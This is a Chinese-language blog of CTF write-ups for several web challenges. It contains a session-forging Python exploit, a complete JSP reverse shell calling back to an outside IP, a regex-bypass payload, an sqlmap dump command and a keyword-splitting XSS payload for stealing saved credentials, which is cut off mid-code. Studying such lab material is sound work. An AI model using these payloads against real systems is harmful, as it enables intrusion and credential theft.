<h1 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h1><p>åŸé¢˜æ˜¯ç»™äº†æºä»£ç çš„</p>
<p><a target="_blank" rel="noopener" href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-200-easy-notes">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-200-easy-notes</a></p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://e808d328-ee1f-4a90-a863-b7bc335e3ab7.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># login as sess_</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    sess.post(URL + <span class="string">&#x27;login.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;sess_&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a crafted note</span></span><br><span class="line">    sess.post(URL + <span class="string">&#x27;add.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;|N;admin|b:1;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a fake session</span></span><br><span class="line">    r = sess.get(URL + <span class="string">&#x27;export.php?type=.&#x27;</span>).headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">    sessid = re.findall(<span class="string">r&#x27;sess_([0-9a-z-]+)&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    r = requests.get(URL + <span class="string">&#x27;?page=flag&#x27;</span>, cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">    &#125;).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag = re.findall(<span class="string">r&#x27;flag\&#123;.+\&#125;&#x27;</span>, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(flag) &gt; <span class="number">0</span>:</span><br><span class="line">        print(flag[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å»GitHubä¸Šä¸‹ä¸‹æ¥åˆ†æä¸€æ³¢</p>
<h1 id="WUSTCTF2020-easyweb"><a href="#WUSTCTF2020-easyweb" class="headerlink" title="[WUSTCTF2020]easyweb"></a>[WUSTCTF2020]easyweb</h1><p>å½“æ—¶åœ¨WUSTCTFçš„å¹³å°å¤ç°è¢«é˜¿é‡Œäº‘æ‹¦æˆªäº†IP, åœ¨buu å¤ç°ä¸€ä¸‹</p>
<p>çŸ¥è¯†ç‚¹å°±æ˜¯</p>
<ul>
<li>tomcat ajp å¹½çµçŒ«ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ ç„¶ågetshell</li>
</ul>
<p>åå¼¹shell.asp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import&#x3D;&quot;java.lang.*&quot;%&gt;</span><br><span class="line">&lt;%@page import&#x3D;&quot;java.util.*&quot;%&gt;</span><br><span class="line">&lt;%@page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@page import&#x3D;&quot;java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  class StreamConnector extends Thread</span><br><span class="line">  &#123;</span><br><span class="line">    InputStream pp;</span><br><span class="line">    OutputStream qk;</span><br><span class="line"></span><br><span class="line">    StreamConnector( InputStream pp, OutputStream qk )</span><br><span class="line">    &#123;</span><br><span class="line">      this.pp &#x3D; pp;</span><br><span class="line">      this.qk &#x3D; qk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run()</span><br><span class="line">    &#123;</span><br><span class="line">      BufferedReader qe  &#x3D; null;</span><br><span class="line">      BufferedWriter ihb &#x3D; null;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        qe  &#x3D; new BufferedReader( new InputStreamReader( this.pp ) );</span><br><span class="line">        ihb &#x3D; new BufferedWriter( new OutputStreamWriter( this.qk ) );</span><br><span class="line">        char buffer[] &#x3D; new char[8192];</span><br><span class="line">        int length;</span><br><span class="line">        while( ( length &#x3D; qe.read( buffer, 0, buffer.length ) ) &gt; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          ihb.write( buffer, 0, length );</span><br><span class="line">          ihb.flush();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; catch( Exception e )&#123;&#125;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        if( qe !&#x3D; null )</span><br><span class="line">          qe.close();</span><br><span class="line">        if( ihb !&#x3D; null )</span><br><span class="line">          ihb.close();</span><br><span class="line">      &#125; catch( Exception e )&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try</span><br><span class="line">  &#123;</span><br><span class="line">    String ShellPath;</span><br><span class="line">if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">  ShellPath &#x3D; new String(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  ShellPath &#x3D; new String(&quot;cmd.exe&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    Socket socket &#x3D; new Socket( &quot;174.1.224.11&quot;, 6666 );</span><br><span class="line">    Process process &#x3D; Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">  &#125; catch( Exception e ) &#123;&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›‘å¬ 6666 ç«¯å£ , å¾—åˆ°re shell å, dir / åˆ—å‡ºæ ¹ç›®å½•, ç„¶å cat å³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407003615.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407003614.png"></p>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123; <span class="comment">// urlä¸­ä¸èƒ½æœ‰config .php</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])); <span class="comment">// basename è¿”å›è·¯å¾„ä¸­æ–‡ä»¶åçš„éƒ¨åˆ† åœ¨ Windows ä¸­ï¼Œæ–œçº¿ï¼ˆ/ï¼‰å’Œåæ–œçº¿ï¼ˆ\ï¼‰éƒ½å¯ä»¥ç”¨ä½œç›®å½•åˆ†éš”ç¬¦ã€‚åœ¨å…¶å®ƒç¯å¢ƒä¸‹æ˜¯æ–œçº¿ï¼ˆ/ï¼‰</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>)); <span class="comment">// ç”Ÿæˆ 64 ä½çš„ ç±»ä¼¼hash çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    $guess = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;guess&#x27;</span>]; <span class="comment">// å¼ºåˆ¶è½¬æ¢ä¸ºstring ç±»å‹</span></span><br><span class="line">    <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123; <span class="comment">// æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦ç›¸ç­‰ï¼Œæœ¬å‡½æ•°çš„æ—¶é—´æ¶ˆè€—æ˜¯æ’å®šçš„ã€‚ , è¿”å›bool , å‚æ•°å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»å‹</span></span><br><span class="line">        $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æ³¨é‡Šè¯´çš„flag æ˜¯åœ¨ <code>config.php</code> è€Œä¸”Google äº†ä¸€æ³¢å, å‘ç° <code>random_bytes</code> è¿™ä¸ªå‡½æ•°æ˜¯<code>CSPRNG</code> çš„</p>
<p><strong>ä»€ä¹ˆæ˜¯ CSPRNGï¼Ÿ</strong></p>
<p>å¼•ç”¨<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">ç»´åŸºç™¾ç§‘</a>çš„å®šä¹‰ï¼Œå¯†ç <a target="_blank" rel="noopener" href="http://blog.oneapm.com/tags-anquan.html">å®‰å…¨</a>çš„è™šæ‹Ÿéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCryptographically Secure Pseudorandom Number Generatorï¼ŒCSPRNGï¼‰æ˜¯å¸¦æœ‰ç‰¹å®šå±æ€§ä½¿ä¹‹åœ¨å¯†ç å­¦ä¸­é€‚ç”¨çš„è™šæ‹Ÿéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆpseudo-random number generatorï¼ŒPRNGï¼‰ã€‚</p>
<p>CSPRNG ä¸»è¦ç”¨äºï¼š</p>
<ul>
<li>ç”Ÿæˆé”®ï¼ˆæ¯”å¦‚ï¼šç”Ÿæˆå¤æ‚çš„é”®ï¼‰</li>
<li>ä¸ºæ–°çš„ç”¨æˆ·è´¦å·ç”Ÿæˆéšæœºå¯†ç </li>
<li>åŠ å¯†ç³»ç»Ÿ</li>
</ul>
<p>ä¿è¯é«˜å®‰å…¨æ°´å‡†çš„ä¸€ä¸ªé‡è¦å› ç´ ä¾¿æ˜¯é«˜è´¨é‡çš„éšæœºæ•°ã€‚</p>
<p>é‚£ä¹ˆå¤§æ¦‚ç‡ä¸‹é¢æ˜¯ä¸èƒ½ç ´è§£çš„äº†</p>
<p>è¿™æ®µä»£ç å¼•èµ·äº†æˆ‘çš„æ³¨æ„: <code>highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407013334.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407013335.png"></p>
<p>ç»•è¿‡æ­£åˆ™<code>preg_match(&#39;/config\.php\/*$/i&#39;,</code> ä¸­<code>$</code> å‡ºç°åœ¨æœ€å, ç”¨<code>%0a</code> æˆ–è€…<code>%0d</code> ç»•è¿‡, è¿™é‡Œä¸è¡Œ, éšä¾¿ç”¨<code>%aa</code> è¿™äº›éƒ½å¯ä»¥bypass</p>
<p>payload</p>
<p><code>/index.php/config.php/%ff?source</code></p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/18598">https://ctftime.org/writeup/18598</a></p>
<p>ä»Šå¤©å°±åˆ·åˆ°è¿™é‡Œå§, å¤ä¹ ä¸€ä¸‹, å°±ç¡è§‰äº†, æ˜å¤©ç»§ç»­ ğŸ˜ª fighting!</p>
<h1 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h1><p>å‰é¢æ˜¯è·Ÿç€ç½‘ç«™çš„å³é”®çœ‹æºç ,ä¸€æ­¥ä¸€æ­¥è·³å°±è¡Œäº†</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="built_in">document</span>.getElementById(<span class="string">&quot;door_form&quot;</span>).elements;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;</span><br><span class="line"></span><br><span class="line">  rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="built_in">window</span>.location = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘éƒ½æœ¬æ¥æ‰“ç®—å†™ä¸ªè„šæœ¬äº†â€¦ ç„¶åçœ‹åˆ°æœ‰ä¸ªjsæºç , ç‚¹è¿›å»å‘ç°æ˜¯éšæœºçš„ <code>rand == guess</code> ä½†æ˜¯åˆåœ¨æŒ‡å®šçª—å£åˆ°<code>/open/</code> ç›´æ¥è®¿é—®, åˆåˆ°äº†fight</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®TODO: æ˜¯è®©æˆ‘ä»¬å»å†™ä¸€ä¸ªè§£ç çš„å‡½æ•°, å¾—åˆ°keyå§, æ ¹æ®ä¸‹é¢çš„flag?</p>
<p>ç›´æ¥çŒœä¸å°±å¥½äº†â€¦â€¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;hey_boyaaaas_im_baaaaaack!&#125;</span><br></pre></td></tr></table></figure>

<p>å“ˆå“ˆ ğŸ˜„</p>
<h1 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h1><ul>
<li>å‰ç«¯å‘èµ·çš„æŸ¥è¯¢</li>
<li>SQLæ³¨å…¥</li>
</ul>
<p>æ„Ÿè§‰è¿™ä¸ªæ¯”èµ›çš„é¢˜æœ‰ç‚¹ å–œæ¬¢è€ƒå¯Ÿå‰ç«¯çš„ä¸œè¥¿, åªä¸è¿‡æˆ‘è¿™é‡Œç”¨ç«ç‹å’ŒChrome æœ‰åŒºåˆ«, äºŒè€…ç»“åˆä½¿ç”¨</p>
<p>éšä¾¿ç‚¹ä¸€ä¸ªç‰©ç§, å‘ç°æœ‰å¦‚ä¸‹è¯·æ±‚,</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407131222.png"></p>
<p><code>/query?search=hellas_basin&amp;&#123;&#125;&amp;_=1586224089437</code>  æŠŠæ—¶é—´æ“å’Œåé¢çš„{} å»æ‰ä¸€æ ·å¯ä»¥æŸ¥è¯¢ç»“æ„, æœ‰çš„è¿”å›å®é™…ç»“æœ, æ²¡æœ‰çš„è¿”å›1 å’Œ 2? é‚£ä¹ˆå°±è¯´æ˜<strong>å¸¦å…¥äº†æŸ¥è¯¢, è¯•è¯•æ³¨å…¥</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407104905.png"></p>
<p>sqlmapå¯åŠ¨, æ‰‹å·¥æ³¨å…¥ä¹Ÿå¯ä»¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;6a00c38d-a615-4dca-8976-9f0a1be5e1da.node3.buuoj.cn&#x2F;query?search&#x3D;hellas_basin -D alien_code -T code -C code,id --dump</span><br></pre></td></tr></table></figure>

<p><strong>ç»†å¿ƒ!</strong> </p>
<p> è¶Šåé¢ å‘ç°é¢˜ç›®èŠ±æ ·è¶Šæ¥è¶Šå¤šäº†</p>
<h1 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h1><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æ³¨å…¥, ä½†æ˜¯æ³¨å†Œä¸€ä¸ªadmin è´¦å·, è¯´å·²ç»å­˜åœ¨äº†,  é‚£ä¹ˆå¾ˆå¯èƒ½æ˜¯ xss æ‰“cookie ä¼ªé€ ç®¡ç†å‘˜ç™»é™†å•¥çš„</p>
<p>åœ¨<code>feedback.php</code> ä¸­æœ‰ä¸€æ®µæ³¨é‡Šäº†çš„phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;åé¦ˆä¸åˆæ³•&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;iframe&#x27;</span>,<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;srcdoc&#x27;</span>,<span class="string">&#x27;location&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;getElement&#x27;</span>,<span class="string">&#x27;document&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line">       <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(stripos($feedback,$val) !== <span class="literal">false</span>)&#123; <span class="comment">// è¾“å…¥ä¸­ä¸èƒ½æœ‰é»‘åå•,ä½†æ˜¯è¿™é‡Œä¸åŒºåˆ†å¤§å°å†™</span></span><br><span class="line">               $feedback = str_ireplace($val,<span class="string">&quot;&quot;</span>,$feedback); <span class="comment">// å°†é»‘åå•çš„å­—ç¬¦æ›¿æ¢ä¸ºç©º, ä¸åŒºåˆ†å¤§å°å†™</span></span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;	    </span><br></pre></td></tr></table></figure>

<p>è¿›ä¸€æ­¥è¯´æ˜äº†æ˜¯XSS æ‰“cookie</p>
<p>åœ¨Chrome ä¸­æ‰“å¼€network åˆ†æ, çœ‹åˆ°äº† login.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;; &#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">&#x27;user&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">&#x27;psw&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;username&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œcookie æœ‰ user å’Œ psw</p>
<p>åœ¨content.php ä¸­æœ‰CSP é˜²æŠ¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;;script-src &#39;unsafe-inline&#39; &#39;self&#39;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯<code>unsafe-inline</code> å…è®¸è½½å…¥å†…è”jsä»£ç , <strong>å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”çš„ script å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„ style å…ƒç´ ï¼Œä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚</strong>è¿™é‡Œæ–‡æœ¬æ¡†æœ¬æ²¡æœ‰å¯¹payloadåšå‡ºé•¿åº¦é™åˆ¶,é‚£å°±æ²¡é—®é¢˜</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">&quot;./js/login.js&quot;</span>&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">String</span>.fromCharCode(<span class="number">0x26</span>);</span><br><span class="line">	<span class="keyword">var</span> psw = docucookiement.getcookieElementsByName(<span 